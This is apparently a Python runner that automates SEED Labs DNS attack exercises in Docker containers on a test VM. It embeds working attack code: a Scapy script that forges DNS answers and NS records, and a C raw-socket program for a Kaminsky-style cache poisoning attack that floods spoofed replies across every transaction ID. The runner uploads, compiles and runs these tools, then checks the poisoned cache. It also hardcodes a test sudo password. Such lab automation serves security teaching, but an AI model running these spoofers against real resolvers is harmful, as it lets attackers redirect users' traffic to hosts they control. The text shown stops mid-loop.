#!/usr/bin/env python
import argparse
import datetime as dt
import json
import os
import re
import shlex
import shutil
import subprocess
import sys
import tempfile
import textwrap
import time
from pathlib import Path


SSH_KEY = Path("~/.ssh/seed-way").expanduser()
SSH_PORT = "2345"
SSH_TARGET = "seed@localhost"
REMOTE_HOME = "/home/seed"

LOCAL_ATTACK_TEMPLATE = textwrap.dedent(
    """\
    #!/usr/bin/env python3
    import argparse
    from scapy.all import DNS, DNSRR, IP, UDP, send, sniff

    TARGET = "www.example.com."
    SENT = False


    def count_rr(record):
        if not record:
            return 0
        count = 0
        current = record
        while current:
            count += 1
            payload = getattr(current, "payload", None)
            if not isinstance(payload, DNSRR):
                break
            current = payload
        return count


    def build_sections(task, qname):
        answer = DNSRR(rrname=qname, type="A", ttl=259200, rdata="1.2.3.5")
        if task == "task1" or task == "task2":
            return answer, None, None

        ns = DNSRR(rrname="example.com.", type="NS", ttl=259200, rdata="ns.attacker32.com.")
        if task == "task3":
            return answer, ns, None

        if task == "task4":
            google_ns = DNSRR(rrname="google.com.", type="NS", ttl=259200, rdata="ns.attacker32.com.")
            return answer, ns / google_ns, None

        ns2 = DNSRR(rrname="example.com.", type="NS", ttl=259200, rdata="ns.example.com.")
        add1 = DNSRR(rrname="ns.attacker32.com.", type="A", ttl=259200, rdata="1.2.3.4")
        add2 = DNSRR(rrname="ns.example.net.", type="A", ttl=259200, rdata="5.6.7.8")
        add3 = DNSRR(rrname="www.facebook.com.", type="A", ttl=259200, rdata="3.4.5.6")
        return answer, ns / ns2, add1 / add2 / add3


    def spoof_dns(pkt, args):
        global SENT
        if DNS not in pkt or not getattr(pkt[DNS], "qd", None):
            return

        qname = pkt[DNS].qd.qname.decode("utf-8", errors="ignore")
        if qname != TARGET:
            return

        if args.task == "task1":
            if pkt[IP].src != "10.9.0.5" or pkt[IP].dst != "10.9.0.53":
                return
            src_ip, dst_ip = pkt[IP].dst, pkt[IP].src
        else:
            if pkt[IP].src != "10.9.0.53":
                return
            src_ip, dst_ip = pkt[IP].dst, pkt[IP].src

        answer, ns, ar = build_sections(args.task, pkt[DNS].qd.qname)
        dns = DNS(
            id=pkt[DNS].id,
            qd=pkt[DNS].qd,
            aa=1,
            rd=pkt[DNS].rd,
            qr=1,
            qdcount=1,
            ancount=1,
            nscount=count_rr(ns),
            arcount=count_rr(ar),
            an=answer,
            ns=ns,
            ar=ar,
        )
        packet = IP(dst=dst_ip, src=src_ip) / UDP(dport=pkt[UDP].sport, sport=53) / dns
        for _ in range(5):
            send(packet, verbose=0)
        print(f"[{args.task}] spoofed {qname} -> {dst_ip}")
        SENT = True


    def main():
        parser = argparse.ArgumentParser()
        parser.add_argument("--task", required=True, choices=["task1", "task2", "task3", "task4", "task5"])
        parser.add_argument("--iface", required=True)
        parser.add_argument("--timeout", type=int, default=25)
        args = parser.parse_args()
        sniff(
            iface=args.iface,
            filter="udp and dst port 53",
            prn=lambda pkt: spoof_dns(pkt, args),
            store=0,
            timeout=args.timeout,
            stop_filter=lambda _: SENT,
        )


    if __name__ == "__main__":
        main()
    """
)

REMOTE_PREPARE_TEMPLATE = textwrap.dedent(
    """\
    #!/usr/bin/env python3
    from scapy.all import DNS, DNSQR, DNSRR, IP, UDP

    LOCAL_DNS = "10.9.0.53"
    QUERY_SRC = "10.9.0.153"
    LEGIT_NS = "{legit_ns_ip}"
    PLACEHOLDER = "twysw"

    name = f"{{PLACEHOLDER}}.example.com"
    qd = DNSQR(qname=name)

    request_dns = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0, arcount=0, qd=qd)
    request_ip = IP(dst=LOCAL_DNS, src=QUERY_SRC, chksum=0)
    request_udp = UDP(dport=53, sport=44444, chksum=0)
    request = request_ip / request_udp / request_dns

    answer = DNSRR(rrname=name, type="A", rdata="1.2.3.4", ttl=259200)
    ns = DNSRR(rrname="example.com", type="NS", rdata="ns.attacker32.com", ttl=259200)
    response_dns = DNS(
        id=0xAAAA,
        aa=1,
        rd=1,
        qr=1,
        qdcount=1,
        ancount=1,
        nscount=1,
        arcount=0,
        qd=qd,
        an=answer,
        ns=ns,
    )
    response_ip = IP(dst=LOCAL_DNS, src=LEGIT_NS, chksum=0)
    response_udp = UDP(dport=33333, sport=53, chksum=0)
    response = response_ip / response_udp / response_dns

    with open("ip_req.bin", "wb") as handle:
        handle.write(bytes(request))

    with open("ip_resp.bin", "wb") as handle:
        handle.write(bytes(response))

    print(f"Prepared ip_req.bin and ip_resp.bin with legitimate NS {{LEGIT_NS}}")
    """
)

REMOTE_ATTACK_C_TEMPLATE = textwrap.dedent(
    """\
    #include <arpa/inet.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <time.h>
    #include <unistd.h>

    #define MAX_FILE_SIZE 1000000

    struct ipheader {
      unsigned char      iph_ihl:4,
                         iph_ver:4;
      unsigned char      iph_tos;
      unsigned short int iph_len;
      unsigned short int iph_ident;
      unsigned short int iph_flag:3,
                         iph_offset:13;
      unsigned char      iph_ttl;
      unsigned char      iph_protocol;
      unsigned short int iph_chksum;
      struct  in_addr    iph_sourceip;
      struct  in_addr    iph_destip;
    };

    static const char *PLACEHOLDER = "twysw";
    static const int SPOOF_IP_COUNT = __SPOOF_IP_COUNT__;
    static const char *SPOOF_IPS[] = { __SPOOF_IP_ARRAY__ };

    void send_raw_packet(char *buffer, int pkt_size);
    void send_dns_request(const unsigned char *packet, int packet_size, const char *name);
    void send_dns_response(const unsigned char *packet, int packet_size, const char *name, const char *src_ip, unsigned short txid);

    int find_offsets(const unsigned char *buffer, int len, const char *needle, int *offsets, int max_offsets)
    {
      int needle_len = strlen(needle);
      int count = 0;
      for (int i = 0; i <= len - needle_len; i++) {
        if (memcmp(buffer + i, needle, needle_len) == 0) {
          if (count < max_offsets) {
            offsets[count] = i;
          }
          count++;
        }
      }
      return count;
    }

    void patch_name(unsigned char *buffer, int len, const char *name)
    {
      int offsets[16];
      int hits = find_offsets(buffer, len, PLACEHOLDER, offsets, 16);
      for (int i = 0; i < hits && i < 16; i++) {
        memcpy(buffer + offsets[i], name, 5);
      }
    }

    int main()
    {
      srand((unsigned int) time(NULL));

      FILE *f_req = fopen("ip_req.bin", "rb");
      if (!f_req) {
        perror("Can't open ip_req.bin");
        return 1;
      }
      unsigned char ip_req[MAX_FILE_SIZE];
      int n_req = (int) fread(ip_req, 1, MAX_FILE_SIZE, f_req);
      fclose(f_req);

      FILE *f_resp = fopen("ip_resp.bin", "rb");
      if (!f_resp) {
        perror("Can't open ip_resp.bin");
        return 1;
      }
      unsigned char ip_resp[MAX_FILE_SIZE];
      int n_resp = (int) fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);
      fclose(f_resp);

      char alphabet[26] = "abcdefghijklmnopqrstuvwxyz";
      while (1) {
        char name[6];
        name[5] = '\\0';
        for (int i = 0; i < 5; i++) {
          name[i] = alphabet[rand() % 26];
        }

        printf("triggering %s.example.com\\n", name);
        fflush(stdout);
        send_dns_request(ip_req, n_req, name);
        for (unsigned int txid = 0; txid <= 0xFFFF; txid++) {
          for (int ip_index = 0; ip_index < SPOOF_IP_COUNT; ip_index++) {
            send_dns_response(ip_resp, n_resp, name, SPOOF_IPS[ip_index], (unsigned short) txid);
          }
        }
      }
      return 0;
    }

    void send_dns_request(const unsigned char *packet, int packet_size, const char *name)
    {
      unsigned char buffer[MAX_FILE_SIZE];
      memcpy(buffer, packet, packet_size);
      patch_name(buffer, packet_size, name);
      send_raw_packet((char *) buffer, packet_size);
    }

    void send_dns_response(const unsigned char *packet, int packet_size, const char *name, const char *src_ip, unsigned short txid)
    {
      unsigned char buffer[MAX_FILE_SIZE];
      memcpy(buffer, packet, packet_size);
      patch_name(buffer, packet_size, name);
      inet_pton(AF_INET, src_ip, buffer + 12);
      unsigned short txid_network = htons(txid);
      memcpy(buffer + 28, &txid_network, 2);
      send_raw_packet((char *) buffer, packet_size);
    }

    void send_raw_packet(char *buffer, int pkt_size)
    {
      struct sockaddr_in dest_info;
      int enable = 1;

      int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
      if (sock < 0) {
        perror("socket");
        exit(1);
      }

      if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)) < 0) {
        perror("setsockopt");
        close(sock);
        exit(1);
      }

      struct ipheader *ip = (struct ipheader *) buffer;
      dest_info.sin_family = AF_INET;
      dest_info.sin_addr = ip->iph_destip;

      if (sendto(sock, buffer, pkt_size, 0, (struct sockaddr *) &dest_info, sizeof(dest_info)) < 0) {
        perror("sendto");
      }

      close(sock);
    }
    """
)


class RunnerError(RuntimeError):
    pass


def now_run_id():
    return dt.datetime.now().strftime("%Y%m%d-%H%M%S")


def slugify(value):
    cleaned = re.sub(r"[^a-zA-Z0-9\u4e00-\u9fff]+", "-", value.strip().lower())
    cleaned = re.sub(r"-{2,}", "-", cleaned).strip("-")
    return cleaned or "step"


def markdown_table(headers, rows):
    table = ["| " + " | ".join(headers) + " |", "| " + " | ".join(["---"] * len(headers)) + " |"]
    for row in rows:
        table.append("| " + " | ".join(str(row.get(header, "")).replace("\n", "<br>") for header in headers) + " |")
    return "\n".join(table)


def short_block(text, max_lines=14):
    lines = [line for line in text.strip().splitlines() if line.strip()]
    if not lines:
        return "无"
    preview = lines[:max_lines]
    if len(lines) > max_lines:
        preview.append("...")
    return "\n".join(preview)


class SeedLabRunner:
    def __init__(self, profile_id, repo_root, run_id=None):
        self.profile_id = profile_id
        self.repo_root = Path(repo_root).resolve()
        self.skill_dir = Path(__file__).resolve().parents[1]
        self.manifest = self._load_manifest(profile_id)
        self.run_id = run_id or now_run_id()
        self.local_run_dir = self.repo_root / "reports" / self.profile_id / self.run_id
        self.evidence_dir = self.local_run_dir / "evidence"
        self.generated_dir = self.evidence_dir / "generated"
        self.summary_path = self.evidence_dir / "summary.json"
        self.report_path = self.local_run_dir / "report.md"
        self.local_run_dir.mkdir(parents=True, exist_ok=True)
        self.generated_dir.mkdir(parents=True, exist_ok=True)
        self.log_counter = 1
        self.summary = {
            "profile_id": self.profile_id,
            "run_id": self.run_id,
            "repo_root": str(self.repo_root),
            "manifest": self.manifest,
            "started_at": dt.datetime.now().isoformat(timespec="seconds"),
            "materials": [],
            "preflight": {},
            "steps": [],
            "generated_files": [],
            "analysis_notes": [],
            "issues": [],
            "status": "in_progress",
        }
        self.remote_workspace = self.manifest["remote_workspace"].replace("~/", f"{REMOTE_HOME}/", 1)
        self.remote_compose_dir = f"{self.remote_workspace}/labsetup"

    def _load_manifest(self, profile_id):
        manifest_path = self.skill_dir / "assets" / "manifests" / f"{profile_id}.yaml"
        if not manifest_path.exists():
            raise RunnerError(f"Unknown profile: {profile_id}")
        return json.loads(manifest_path.read_text(encoding="utf-8"))

    def _ssh_base(self):
        return [
            "ssh",
            "-i",
            str(SSH_KEY),
            "-p",
            SSH_PORT,
            "-o",
            "StrictHostKeyChecking=accept-new",
            "-o",
            "ConnectTimeout=10",
            SSH_TARGET,
        ]

    def _scp_base(self):
        return [
            "scp",
            "-i",
            str(SSH_KEY),
            "-P",
            SSH_PORT,
            "-o",
            "StrictHostKeyChecking=accept-new",
        ]

    def _log_path(self, title):
        filename = f"{self.log_counter:02d}-{slugify(title)}.log"
        self.log_counter += 1
        return self.evidence_dir / filename

    def _write_log(self, path, content):
        path.write_text(content, encoding="utf-8")

    def _record_step(self, title, status, description, human_command, actual_command, result, log_path):
        self.summary["steps"].append(
            {
                "title": title,
                "status": status,
                "description": description,
                "human_command": human_command,
                "actual_command": actual_command,
                "result_preview": short_block(result),
                "log_path": str(log_path.relative_to(self.local_run_dir)),
            }
        )
        self._save_summary()

    def _save_summary(self):
        self.summary_path.write_text(json.dumps(self.summary, indent=2, ensure_ascii=False), encoding="utf-8")

    def _run_subprocess(self, command, title, description, human_command, cwd=None, allow_fail=False):
        log_path = self._log_path(title)
        completed = subprocess.run(command, cwd=cwd, capture_output=True, text=True)
        output = f"$ {' '.join(command)}\n\n[exit={completed.returncode}]\n\nSTDOUT:\n{completed.stdout}\n\nSTDERR:\n{completed.stderr}"
        self._write_log(log_path, output)
        status = "ok" if completed.returncode == 0 else "failed"
        self._record_step(title, status, description, human_command, " ".join(command), completed.stdout + completed.stderr, log_path)
        if completed.returncode != 0 and not allow_fail:
            raise RunnerError(f"{title} failed: {completed.stderr.strip() or completed.stdout.strip()}")
        return completed

    def run_local(self, shell_command, title, description, human_command=None, allow_fail=False, cwd=None):
        human = human_command or shell_command
        return self._run_subprocess(
            ["/bin/zsh", "-lc", shell_command],
            title=title,
            description=description,
            human_command=human,
            cwd=cwd,
            allow_fail=allow_fail,
        )

    def run_remote(self, shell_command, title, description, human_command=None, allow_fail=False, interactive=False):
        wrapped = shell_command
        bash_flag = "-ic" if interactive else "-lc"
        return self._run_subprocess(
            self._ssh_base() + [f"bash {bash_flag} {shlex.quote(wrapped)}"],
            title=title,
            description=description,
            human_command=human_command or shell_command,
            allow_fail=allow_fail,
        )

    def run_remote_container(self, container, shell_command, title, description, human_command=None, allow_fail=False):
        actual = f"docker exec {container} bash -lc {shlex.quote(shell_command)}"
        human = human_command or f"相当于 docksh {container[:2]} 后执行: {shell_command}"
        return self.run_remote(actual, title, description, human_command=human, allow_fail=allow_fail)

    def run_remote_container_detached(self, container, shell_command, title, description, human_command=None):
        actual = f"docker exec -d {container} bash -lc {shlex.quote(shell_command)}"
        human = human_command or f"相当于在 {container} 内后台执行: {shell_command}"
        return self.run_remote(actual, title, description, human_command=human)

    def add_issue(self, message):
        if message not in self.summary["issues"]:
            self.summary["issues"].append(message)
            self._save_summary()

    def add_analysis(self, title, body):
        self.summary["analysis_notes"].append({"title": title, "body": body})
        self._save_summary()

    def save_generated_file(self, relative_name, content):
        local_path = self.generated_dir / relative_name
        local_path.parent.mkdir(parents=True, exist_ok=True)
        local_path.write_text(content, encoding="utf-8")
        self.summary["generated_files"].append(str(local_path.relative_to(self.local_run_dir)))
        self._save_summary()
        return local_path

    def upload_file(self, local_path, remote_path, title, description):
        remote_parent = os.path.dirname(remote_path)
        self.run_remote(f"mkdir -p {shlex.quote(remote_parent)}", f"{title} - 建目录", "准备远端目录", human_command=f"mkdir -p {remote_parent}")
        return self._run_subprocess(
            self._scp_base() + [str(local_path), f"{SSH_TARGET}:{remote_path}"],
            title=title,
            description=description,
            human_command=f"scp {local_path.name} -> {remote_path}",
        )

    def sync_setup(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            source = self.repo_root / self.manifest["setup_path"]
            normalized = Path(temp_dir) / "labsetup"
            shutil.copytree(source, normalized)
            self.run_remote(f"rm -rf {shlex.quote(self.remote_workspace)} && mkdir -p {shlex.quote(self.remote_workspace)}", "重建远端工作区", "清理并重建远端标准工作区", human_command=f"mkdir -p {self.remote_workspace}")
            self._run_subprocess(
                self._scp_base() + ["-r", str(normalized), f"{SSH_TARGET}:{self.remote_workspace}/"],
                title="迁移 Labsetup",
                description="把标准化后的 Labsetup 复制到远端工作区",
                human_command=f"scp -r Labsetup -> {self.remote_workspace}/labsetup",
            )

    def collect_materials(self):
        rows = []
        for item in self.manifest["materials_checks"]:
            path = self.repo_root / item["path"]
            exists = path.exists()
            rows.append(
                {
                    "项目": item["label"],
                    "路径": item["path"],
                    "状态": "已找到" if exists else "缺失",
                    "说明": "必需" if item.get("required", True) else "可选",
                }
            )
            if item.get("required", True) and not exists:
                self.add_issue(f"缺少实验材料: {item['path']}")
        self.summary["materials"] = rows
        self._save_summary()
        return rows

    def run_preflight(self):
        materials = self.collect_materials()
        docker_count = self.run_remote(
            "docker ps -q | wc -l | tr -d ' '",
            "读取容器数量",
            "检查远端当前运行中的容器数量",
            human_command="dockps",
        ).stdout.strip()
        leftover_networks = self.run_remote(
            "docker network ls --format '{{.Name}}' | grep -Ev '^(bridge|host|none)$' || true",
            "读取残留网络",
            "检查远端是否存在非默认 Docker 网络",
            human_command="docker network ls",
        ).stdout.strip()
        preflight_rows = [
            {
                "检查项": "SSH 连通性",
                "结果": "通过" if self.run_remote("whoami", "检查 SSH", "验证远端 SSH 登录是否可用").stdout.strip() == "seed" else "异常",
                "详情": "seed@localhost:2345",
            },
            {
                "检查项": "操作系统",
                "结果": "通过",
                "详情": self.run_remote("grep '^PRETTY_NAME=' /etc/os-release", "读取 OS 版本", "确认远端系统版本").stdout.strip().replace("PRETTY_NAME=", ""),
            },
            {
                "检查项": "sudo 密码",
                "结果": "通过" if "SUDO_OK" in self.run_remote("echo dees | sudo -S -k true && echo SUDO_OK", "验证 sudo", "验证测试 VM 的 sudo 密码").stdout else "失败",
                "详情": "使用测试密码 dees",
            },
            {
                "检查项": "Docker Compose",
                "结果": "通过",
                "详情": self.run_remote("command -v docker-compose", "定位 docker-compose", "确认 docker-compose 命令存在").stdout.strip(),
            },
            {
                "检查项": "SEED 别名",
                "结果": "通过",
                "详情": short_block(
                    self.run_remote(
                        "type dcbuild dcup dcdown dockps docksh",
                        "检查交互式别名",
                        "确认 SEED VM 常用 Docker 别名在交互 shell 中可用",
                        human_command="bash -ic 'type dcbuild dcup dcdown dockps docksh'",
                        interactive=True,
                    ).stdout
                ),
            },
            {
                "检查项": "Python 运行时",
                "结果": "通过",
                "详情": short_block(
                    self.run_remote("command -v python3 && python3 --version", "检查远端 Python", "确认远端只依赖 python3").stdout
                ),
            },
            {
                "检查项": "Docker 环境洁净度",
                "结果": "注意" if docker_count != "0" or leftover_networks else "通过",
                "详情": f"运行容器数={docker_count}; 残留网络={leftover_networks or '无'}",
            },
        ]
        self.summary["preflight"] = {"materials": materials, "checks": preflight_rows}
        self._save_summary()
        self.render_report()
        return preflight_rows

    def ensure_local_attack_script(self):
        local_path = self.save_generated_file("dns_spoof_lab.py", LOCAL_ATTACK_TEMPLATE)
        self.upload_file(local_path, f"{self.remote_compose_dir}/volumes/dns_spoof_lab.py", "上传本地 DNS 攻击脚本", "把自动生成的 Scapy 攻击脚本上传到远端 Labsetup")

    def ensure_remote_attack_files(self, legit_ns_ips):
        prepare_content = REMOTE_PREPARE_TEMPLATE.format(legit_ns_ip=legit_ns_ips[0])
        attack_content = REMOTE_ATTACK_C_TEMPLATE.replace("__SPOOF_IP_COUNT__", str(len(legit_ns_ips))).replace(
            "__SPOOF_IP_ARRAY__", ", ".join(f'"{item}"' for item in legit_ns_ips)
        )
        prepare_local = self.save_generated_file("prepare_packets.py", prepare_content)
        attack_local = self.save_generated_file("attack.c", attack_content)
        self.upload_file(prepare_local, f"{self.remote_compose_dir}/Files/prepare_packets.py", "上传 prepare_packets.py", "把 Kaminsky 模板生成脚本上传到远端 Files")
        self.upload_file(prepare_local, f"{self.remote_compose_dir}/volumes/prepare_packets.py", "同步模板脚本到 volumes", "让攻击者容器可直接访问模板生成脚本")
        self.upload_file(attack_local, f"{self.remote_compose_dir}/Files/attack.c", "上传 attack.c", "把补全后的 attack.c 上传到远端 Files")
        self.upload_file(attack_local, f"{self.remote_compose_dir}/volumes/attack.c", "同步 attack.c 到 volumes", "让攻击者容器可直接编译 attack.c")

    def bring_up_compose(self):
        self.run_remote(
            f"cd {shlex.quote(self.remote_compose_dir)} && docker-compose down --remove-orphans || true",
            "关闭旧环境",
            "先用非破坏性方式收起旧的 compose 环境",
            human_command="dcdown",
            allow_fail=True,
        )
        self.cleanup_stale_compose_resources()
        self.run_remote(
            f"cd {shlex.quote(self.remote_compose_dir)} && docker-compose build",
            "构建镜像",
            "构建 Labsetup 里的镜像",
            human_command="dcbuild",
        )
        self.run_remote(
            f"cd {shlex.quote(self.remote_compose_dir)} && docker-compose up -d",
            "启动环境",
            "启动 compose 环境并让容器后台运行",
            human_command="dcup",
        )
        time.sleep(8)
        self.run_remote("docker ps --format 'table {{.Names}}\\t{{.Status}}'", "检查运行容器", "确认 compose 启动后的容器状态", human_command="dockps")

    def teardown_compose(self):
        self.run_remote(
            f"cd {shlex.quote(self.remote_compose_dir)} && docker-compose down --remove-orphans",
            "收尾关闭环境",
            "在证据收集完成后关闭 compose 环境，避免脏状态残留",
            human_command="dcdown",
            allow_fail=True,
        )

    def expected_container_names(self):
        if self.profile_id == "lab4-dns-local":
            return [
                "seed-router",
                "local-dns-server-10.9.0.53",
                "user-10.9.0.5",
                "seed-attacker",
                "attacker-ns-10.9.0.153",
            ]
        if self.profile_id == "lab4-dns-remote":
            return [
                "local-dns-server-10.9.0.53",
                "user-10.9.0.5",
                "seed-attacker",
                "attacker-ns-10.9.0.153",
            ]
        return []

    def expected_network_names(self):
        if self.profile_id == "lab4-dns-local":
            return ["net-10.8.0.0", "net-10.9.0.0"]
        if self.profile_id == "lab4-dns-remote":
            return ["seed-net"]
        return []

    def cleanup_stale_compose_resources(self):
        containers = " ".join(shlex.quote(name) for name in self.expected_container_names())
        networks = " ".join(shlex.quote(name) for name in self.expected_network_names())
        if containers:
            self.run_remote(
                f"for name in {containers}; do docker rm -f \"$name\" >/dev/null 2>&1 || true; done",
                "清理残留同名容器",
                "移除历史运行留下的同名 lab 容器，避免 compose 因命名冲突失败",
                human_command="docker rm -f <lab-containers>",
                allow_fail=True,
            )
        if networks:
            self.run_remote(
                f"for name in {networks}; do docker network rm \"$name\" >/dev/null 2>&1 || true; done",
                "清理残留 lab 网络",
                "移除当前 profile 的残留网络定义，让 compose 以受控方式重建网络",
                human_command="docker network rm <lab-networks>",
                allow_fail=True,
            )

    def get_bridge_iface(self):
        result = self.run_remote(
            "ip -o -4 addr show | awk '$4 ~ /^10\\.9\\.0\\.1\\/24/ {print $2; exit}'",
            "定位桥接网卡",
            "找到 10.9.0.0/24 对应的 host bridge 接口，供嗅探使用",
        ).stdout.strip()
        if not result:
            raise RunnerError("未找到 10.9.0.0/24 对应的 bridge 接口")
        return result

    def get_router_external_iface(self):
        return self.run_remote_container(
            "seed-router",
            "ip -o -4 addr show | awk '$4 ~ /^10\\.8\\.0\\.11\\/24/ {print $2; exit}'",
            "定位路由器外网口",
            "找到 router 容器里连接 10.8.0.0/24 的接口",
        ).stdout.strip()

    def flush_dns_cache(self):
        self.run_remote_container(
            "local-dns-server-10.9.0.53",
            "rndc flush",
            "清空 DNS 缓存",
            "在本地 DNS 服务器上清空缓存，避免旧结果干扰攻击",
        )

    def dump_dns_cache(self, title):
        return self.run_remote_container(
            "local-dns-server-10.9.0.53",
            "rndc dumpdb -cache >/dev/null 2>&1 && cat /var/cache/bind/dump.db",
            title,
            "导出本地 DNS 服务器缓存以便留档分析",
        ).stdout

    def user_dig(self, command, title):
        return self.run_remote_container(
            "user-10.9.0.5",
            command,
            title,
            "从用户容器执行 dig 验证命令",
        ).stdout

    def baseline_dns_checks(self):
        ns_ip = self.user_dig("dig +short ns.attacker32.com", "基线检查 ns.attacker32.com")
        official = self.user_dig("dig +short www.example.com", "基线检查官方 www.example.com")
        attacker = self.user_dig("dig +short @ns.attacker32.com www.example.com", "基线检查攻击者权威结果")
        self.add_analysis(
            "DNS 配置基线",
            "\n".join(
                [
                    f"ns.attacker32.com -> {ns_ip.strip() or '无输出'}",
                    f"www.example.com -> {official.strip() or '无输出'}",
                    f"@ns.attacker32.com www.example.com -> {attacker.strip() or '无输出'}",
                ]
            ),
        )
        return ns_ip, official, attacker

    def enable_router_delay(self):
        iface = self.get_router_external_iface()
        if iface:
            self.run_remote_container(
                "seed-router",
                f"tc qdisc replace dev {iface} root netem delay 200ms && tc qdisc show dev {iface}",
                "设置路由延迟",
                "在 router 外网口人为增加 200ms 延迟，降低合法响应抢先到达的概率",
            )
            return iface
        return None

    def stop_local_attack_process(self):
        self.run_remote_container(
            "seed-attacker",
            "pkill -f dns_spoof_lab.py || true",
            "停止本地攻击后台脚本",
            "确保攻击者容器里没有残留的后台嗅探进程",
            allow_fail=True,
        )

    def read_attacker_log(self, name):
        return self.run_remote_container(
            "seed-attacker",
            f"cat /volumes/{name}.log || true",
            f"读取 {name} 攻击日志",
            "读取攻击者容器里自动生成的日志文件",
            allow_fail=True,
        ).stdout

    def execute_local_task(self, task_name, trigger_command, verifier, cache_grep_command=None, analysis_title=None, analysis_builder=None):
        bridge_iface = self.get_bridge_iface()
        success_data = None
        for attempt in range(1, 4):
            self.flush_dns_cache()
            self.stop_local_attack_process()
            self.run_remote_container_detached(
                "seed-attacker",
                f"python3 /volumes/dns_spoof_lab.py --task {task_name} --iface {bridge_iface} --timeout 25 >/volumes/{task_name}.log 2>&1",
                f"后台启动 {task_name}",
                "在攻击者容器里后台启动对应的 Scapy 攻击脚本，等待嗅探并伪造 DNS 响应",
            )
            time.sleep(2)
            trigger_output = self.user_dig(trigger_command, f"{task_name} 触发 dig (attempt {attempt})")
            time.sleep(2)
            cache_dump = self.dump_dns_cache(f"{task_name} 导出缓存 (attempt {attempt})")
            self.stop_local_attack_process()
            attacker_log = self.read_attacker_log(task_name)
            grep_output = ""
            if cache_grep_command:
                grep_output = self.run_remote_container(
                    "local-dns-server-10.9.0.53",
                    cache_grep_command,
                    f"{task_name} 缓存筛选 (attempt {attempt})",
                    "筛出缓存里的关键记录，便于对比任务目标",
                    allow_fail=True,
                ).stdout
            if verifier(trigger_output, cache_dump, grep_output, attacker_log):
                success_data = {
                    "attempt": attempt,
                    "trigger_output": trigger_output,
                    "cache_dump": cache_dump,
                    "grep_output": grep_output,
                    "attacker_log": attacker_log,
                }
                break
            self.add_issue(f"{task_name} 第 {attempt} 次尝试未达到预期，已自动重试。")

        if not success_data:
            raise RunnerError(f"{task_name} 在自动重试后仍未达到预期结果")

        if analysis_title and analysis_builder:
            self.add_analysis(analysis_title, analysis_builder(success_data))
        return success_data

    def execute_lab4_dns_local(self):
        self.ensure_local_attack_script()
        self.bring_up_compose()
        self.baseline_dns_checks()
        self.enable_router_delay()

        task1 = self.execute_local_task(
            "task1",
            "dig +short www.example.com",
            verifier=lambda trig, cache, grep_out, log: "1.2.3.5" in trig and "spoofed" in log,
            analysis_title="任务 1：直接向用户伪造响应",
            analysis_builder=lambda data: textwrap.dedent(
                f"""\
                第 {data['attempt']} 次尝试成功。
                用户侧 dig 结果:
                {short_block(data['trigger_output'])}

                攻击日志:
                {short_block(data['attacker_log'])}
                """
            ),
        )

        task2 = self.execute_local_task(
            "task2",
            "dig +short www.example.com && dig +short www.example.com",
            verifier=lambda trig, cache, grep_out, log: "1.2.3.5" in trig and "www.example.com" in cache and "1.2.3.5" in cache,
            cache_grep_command="grep -n 'www.example.com\\|1.2.3.5' /var/cache/bind/dump.db || true",
            analysis_title="任务 2：DNS 缓存投毒",
            analysis_builder=lambda data: textwrap.dedent(
                f"""\
                第 {data['attempt']} 次尝试成功。
                两次 dig 输出:
                {short_block(data['trigger_output'])}

                缓存筛选:
                {short_block(data['grep_output'])}
                """
            ),
        )

        task3 = self.execute_local_task(
            "task3",
            "dig +short www.example.com && dig +short mail.example.com && dig +short @ns.attacker32.com mail.example.com",
            verifier=lambda trig, cache, grep_out, log: "1.2.3.6" in trig and "attacker32.com" in cache,
            cache_grep_command="grep -n 'example.com\\|attacker32.com' /var/cache/bind/dump.db || true",
            analysis_title="任务 3：伪造 NS 记录",
            analysis_builder=lambda data: textwrap.dedent(
                f"""\
                第 {data['attempt']} 次尝试成功。
                dig 结果:
                {short_block(data['trigger_output'])}

                缓存筛选:
                {short_block(data['grep_output'])}
                """
            ),
        )

        task4 = self.execute_local_task(
            "task4",
            "dig +short www.example.com",
            verifier=lambda trig, cache, grep_out, log: "example.com" in cache,
            cache_grep_command="grep -n 'google.com\\|example.com\\|attacker32.com' /var/cache/bind/dump.db || true",
            analysis_title="任务 4：伪造另一个域的 NS 记录",
            analysis_builder=lambda data: textwrap.dedent(
                f"""\
                第 {data['attempt']} 次尝试完成。
                关键缓存记录:
                {short_block(data['grep_output'])}

                观察: 缓存里保留了与当前查询域相关的记录，而与查询无关的 google.com 记录通常不会被接受。
                """
            ),
        )

        task5 = self.execute_local_task(
            "task5",
            "dig +short www.example.com",
            verifier=lambda trig, cache, grep_out, log: "attacker32.com" in cache,
            cache_grep_command="grep -n 'attacker32.com\\|example.net\\|facebook.com\\|1.2.3.4\\|5.6.7.8\\|3.4.5.6' /var/cache/bind/dump.db || true",
            analysis_title="任务 5：附加部分记录缓存",
            analysis_builder=lambda data: textwrap.dedent(
                f"""\
                第 {data['attempt']} 次尝试完成。
                关键缓存记录:
                {short_block(data['grep_output'])}

                观察: 与权威记录直接相关的 glue 记录更容易留下，而无关的额外条目不会稳定缓存。
                """
            ),
        )

        self.summary["status"] = "completed"
        self.summary["completed_at"] = dt.datetime.now().isoformat(timespec="seconds")
        self._save_summary()
        self.render_report()
        self.teardown_compose()
        return {
            "task1": task1,
            "task2": task2,
            "task3": task3,
            "task4": task4,
            "task5": task5,
        }

    def execute_lab4_dns_remote(self):
        self.bring_up_compose()
        self.baseline_dns_checks()
        legit_ns_output = self.user_dig(
            "for ns in $(dig +short NS example.com); do dig +short $ns; done | grep -E '^[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+$' | sort -u",
            "查询合法权威 NS IP",
        )
        legit_ns_ips = [line.strip() for line in legit_ns_output.splitlines() if line.strip()]
        if not legit_ns_ips:
            raise RunnerError("无法解析 example.com 当前权威服务器的 IPv4 地址")
        self.ensure_remote_attack_files(legit_ns_ips)
        self.flush_dns_cache()
        self.run_remote_container(
            "seed-attacker",
            "cd /volumes && python3 prepare_packets.py",
            "生成 Kaminsky 数据包模板",
            "在攻击者容器里用 Scapy 生成请求与响应模板",
        )
        self.run_remote(
            f"cd {shlex.quote(self.remote_compose_dir)}/volumes && gcc -O2 -o attack attack.c",
            "编译 attack.c",
            "在宿主机的挂载目录里编译补全后的 attack.c，避免依赖容器内缺失的 gcc",
            human_command="gcc -O2 -o attack attack.c",
        )

        success = None
        for attempt in range(1, 4):
            self.flush_dns_cache()
